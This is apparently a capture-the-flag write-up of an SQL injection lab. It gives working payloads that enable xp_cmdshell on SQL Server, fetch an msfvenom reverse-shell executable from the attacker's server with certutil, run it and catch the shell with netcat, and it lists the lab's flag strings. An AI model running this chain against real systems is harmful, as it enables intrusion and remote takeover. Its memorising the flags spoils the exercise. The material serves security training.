# SQL Injection

# Fisrt webpaget that contains the gift-finding feature
In the homepage, we can see a link to the gift-finding feature.
path: /giftsearch.php

# SQL error message - what ODBC Driver is used
/giftresults.php?age='
[Microsoft][ODBC Driver 17 for SQL Server]

# Last result returned in the db
/giftresults.php?age=' OR 1=1 --
THM{a4ffc901c27fb89efe3c31642ece4447}

# Flag in the note file on system
Own IP: 10.10.53.30
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.53.30 LPORT=1337 -f exe -o calc.exe
```
Generate a reverse shell payload
```bash
python3 -m http.server 1338
```
Start a web server to host the payload
Setup cmd execution
http://10.10.110.16/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --

Download payload on target
http://10.10.110.16/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.53.30:1338/calc.exe C:\Windows\Temp\calc.exe'; --

```bash
nc -lvnp 1337
```
Start a listener

Detonate the payload
http://10.10.110.16/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\calc.exe'; --


After getting a revshell
```batch
cd C:\Users\Administrator\Desktop
type Note.txt
```

THM{b06674fedd8dfc28ca75176d3d51409e}

# Flag on homepage after restoring website
Run
```batch
C:\Users\Administrator\Desktop\restore_website.bat
```

THM{4cbc043631e322450bc55b42c}

